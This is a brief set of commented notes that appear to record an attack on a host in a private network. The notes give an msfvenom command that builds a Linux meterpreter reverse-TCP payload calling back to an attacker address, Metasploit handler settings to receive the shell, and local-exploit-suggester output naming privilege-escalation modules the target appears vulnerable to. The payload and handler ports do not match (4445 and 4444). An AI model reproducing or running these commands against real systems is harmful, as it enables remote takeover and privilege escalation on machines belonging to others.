# PAYLOAD = msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4445 -f elf -o /tmp/payload.bin

# Metasploit usage:
# use exploit/multi/handler
# set lhost = 192.168.100.5
# set lport = 4444
# set PAYLOAD linux/x86/meterpreter/reverse_tcp
# run

#					RESULTS OF RUNNING post/multi/recon/local_exploit_suggester
#
#	[+] 192.168.100.7 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.
#	[+] 192.168.100.7 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.
#	[+] 192.168.100.7 - exploit/linux/local/pkexec: The service is running, but could not be validated.
#	[+] 192.168.100.7 - exploit/linux/local/su_login: The target appears to be vulnerable.
#
#
#
#
#
#
#
#
#
#
